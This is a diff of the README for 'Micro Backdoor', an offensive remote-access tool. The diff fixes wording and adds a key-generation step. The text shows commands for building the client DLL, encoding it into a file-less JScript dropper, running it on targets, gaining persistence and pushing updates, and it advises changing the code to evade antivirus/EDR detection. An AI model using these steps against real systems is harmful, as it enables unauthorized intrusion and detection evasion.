@@ -143,7 +143,7 @@ $ ./server.py --client <target_ID> --update <dropper_path>
 
 ## Deploying the server
 
-For easy deployment of Micro Backdoor serer there's [Fabric](https://www.fabfile.org/) scenario located in `fabfile.py` Python script. To deploy the server to the remote Linux host you have to perform the following steps.
+For easy deployment of Micro Backdoor server there's [Fabric](https://www.fabfile.org/) scenario located in `fabfile.py` Python script. To deploy the server to the remote Linux host you have to perform the following steps.
 
 1) Edit `.ssh_config` file located in the project directory and add your server information there, for example:
 
@@ -166,7 +166,7 @@ Host my-server
 
 # Configuring the client
 
-Micro Backdoor client consists from binary part used to implement backdoor functionality and JScript wrapper combined with the shellcode used to run and deliver the binary part in file-less way.  
+Micro Backdoor client consists from the binary part used to implement backdoor functionality and JScript wrapper combined with the shellcode used to run and deliver the binary part in file-less way.  
 
 ⚠️ **JScript and PowerShell code used in client dropper is easily detectable by most of AV/EDR products, you should consider to modify it [or use other methods](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorBoot) to deliver the binary part of the client**  
 
@@ -176,7 +176,7 @@ First, you have to configure the binary using `./client_builder.py` command line
 $ ./client_builder.py client.dll [server_IP]
 ```
 
-Also, you can specify `client_amd64.dll` file to use x86_64 version of the client, or `client_debug.dll`/`client_amd64_debug.dll` to use debug build of the client that prints diagnostic messages into the standard Windows debug output.  
+Also, you can specify `client_amd64.dll` file to use x86_64 version of the client, or `client_debug.dll`/`client_amd64_debug.dll` to use debug build of the client that prints diagnostic messages into the standard Windows debug output. Before running `client_builder.py` you need to generate RSA key pair, see [Configuring the server](#configuring-the-server) section of this document.  
 
 You can use configured client binary with your own delivery tool: exploit, reflective loader, etc. Or you can generate JScript client dropper:
 
@@ -184,7 +184,7 @@ You can use configured client binary with your own delivery tool: exploit, refle
 $ ./client_encoder.py dll_inject_script client.dll > dropper.js
 ```
 
-After the `dropper.js` was generated you can deploy it on your targets. In Windows command line you can execute JS files in the following way: `cscript.exe dropper.js`. Or you can just double click JS file in Windows Explorer to run the dropper. Micro Backdoor client provides persistence within current user account used to run the dropper, it can work with any privileges and medium integrity level.
+After the `dropper.js` was generated you can deploy it on your targets. In Windows command line you can run JScript files by running `cscript.exe dropper.js`. Or you can just double click JS file in Windows Explorer to run the dropper. Micro Backdoor client provides persistence within current user account used to run the dropper, it can work with any privileges and medium integrity level.
 
 ## Developed by
 
